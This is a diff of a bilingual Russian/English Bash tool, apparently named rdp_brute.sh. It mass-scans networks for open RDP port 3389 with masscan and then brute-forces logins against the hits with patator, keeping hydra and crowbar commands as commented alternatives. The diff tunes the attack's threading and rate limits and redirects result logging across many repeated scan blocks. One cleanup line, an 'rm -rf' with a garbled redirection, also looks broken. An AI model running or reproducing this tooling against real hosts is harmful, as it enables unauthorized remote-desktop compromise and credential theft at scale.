@@ -13,7 +13,7 @@ grey="\033[1;37m"
 ##########################################CLEAR#######################################
 CLEARALL ()
 {
-rm -rf hydra.restore result paused.conf crowbar.out crowbar.log 2> /dev/null
+rm -rf Results/ paused.conf 2 list> /dev/null
 }
 ########################################TESTROOT######################################
 TESTROOT()
@@ -283,10 +283,11 @@ read -p "*Укажите путь к файлу со списком пароле
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
-python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open3389 1=$passlist -x ignore:code=1 > patator
+python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+clear
 TESTRESULTRU
 echo -e "\n$red***ОШИБКА! Неверно указан логин или файл с паролями"
 echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
@@ -303,10 +304,11 @@ read -p "*Введите пароль {administrator, admin, 123456 & etc.} : " 
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=$passbrute 0=open3389 1=users -x ignore:code=1 > patator
+python patator.py rdp_login host=FILE0 user=FILE1 password=$passbrute 0=open3389 1=users -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open
 #hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+clear
 TESTRESULTRU
 echo -e "\n$red***ОШИБКА! Неверно указан файл с логинами или не указан пароль"
 echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
@@ -323,10 +325,11 @@ read -p "*Укажите путь к файлу со списком пароле
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -x ignore:code=1 > patator
+python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open
 #hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+clear
 TESTRESULTRU
 echo -e "\n$red***ОШИБКА! Неверно указан файл с логинами или файл с паролями"
 echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
@@ -341,11 +344,12 @@ if [ "$brutmenu" = "4" ]; then
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dictionary/pass -x ignore:code=1 > patator 
+python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dictionary/pass -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -U $PWD/users  -C $PWD/dictionary/pass -S $PWD/open 
 #hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
+clear
 TESTRESULTRU
 
 
@@ -387,7 +391,7 @@ read -p "*Enter the path to the file with a list of passwords {'/home/dictionary
 clear
 echo -e "                              $green Start bruteforceing"
 echo ""
-python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open3389 1=$passlist -x ignore:code=1 > patator 
+python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -407,7 +411,7 @@ read -p "*Enter the password {administrator, admin, 123456 & etc.} : " passbrute
 clear
 echo -e "                              $green Start bruteforceing"
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=$passbrute 0=open3389 1=users -x ignore:code=1 > patator 
+python patator.py rdp_login host=FILE0 user=FILE1 password=$passbrute 0=open3389 1=users -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -427,7 +431,7 @@ read -p "*Enter the path to passwords dictionary {'/home/dictionary/pass'}: " pa
 clear
 echo -e "                              $green Start bruteforceing"
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -x ignore:code=1 > patator 
+python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -444,7 +448,7 @@ if [ "$brutmenu" = "4" ]; then
 clear
 echo -e "                              $green Start bruteforceing "
 echo ""
-python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dictionary/pass -x ignore:code=1 > patator 
+python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dictionary/pass -t 15 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
 #python crowbar.py -b rdp -U $PWD/users -C $PWD/dictionary/pass -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; exit; ./rdp_brute.sh' 2
@@ -490,11 +494,11 @@ echo -e "$red-------------------------------------------------------------------
 masscan $target -p3389 --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
                          
 echo ""                                  
 echo -e "$aquamarine                            Адреса с открытым RDP портом:$green"    
-cat open                             
+cat open3389                         
 echo ""
 echo -e "$red Хосты с открытым RDP портом записаны в файл $PWD/open3389"
 sleep 2
@@ -520,11 +524,11 @@ echo -e "$yellow*Для выхода из режима сканирования 
 masscan -p3389 -iL $listname --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 echo ""
 echo -e "$aquamarine                            Адреса с открытым RDP портом:$green" 
-cat open
+cat open3389
 echo ""
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
 
@@ -579,7 +583,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -625,7 +629,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -673,7 +677,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 
@@ -723,7 +727,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -771,7 +775,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -820,7 +824,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -868,7 +872,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -916,7 +920,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -963,7 +967,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1011,7 +1015,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1059,7 +1063,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1107,7 +1111,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1156,7 +1160,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1205,7 +1209,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1254,7 +1258,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1303,7 +1307,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1352,7 +1356,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1401,7 +1405,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1450,7 +1454,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1499,7 +1503,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1548,7 +1552,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1596,7 +1600,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1644,7 +1648,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1692,7 +1696,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1741,7 +1745,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1789,7 +1793,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1838,7 +1842,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1887,7 +1891,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1936,7 +1940,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -1985,7 +1989,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2034,7 +2038,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2083,7 +2087,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2131,7 +2135,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2180,7 +2184,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2228,7 +2232,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2276,7 +2280,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2323,7 +2327,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2372,7 +2376,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2421,7 +2425,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2470,7 +2474,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2519,7 +2523,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2568,7 +2572,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2617,7 +2621,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2666,7 +2670,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2715,7 +2719,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2764,7 +2768,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2813,7 +2817,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -2862,7 +2866,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
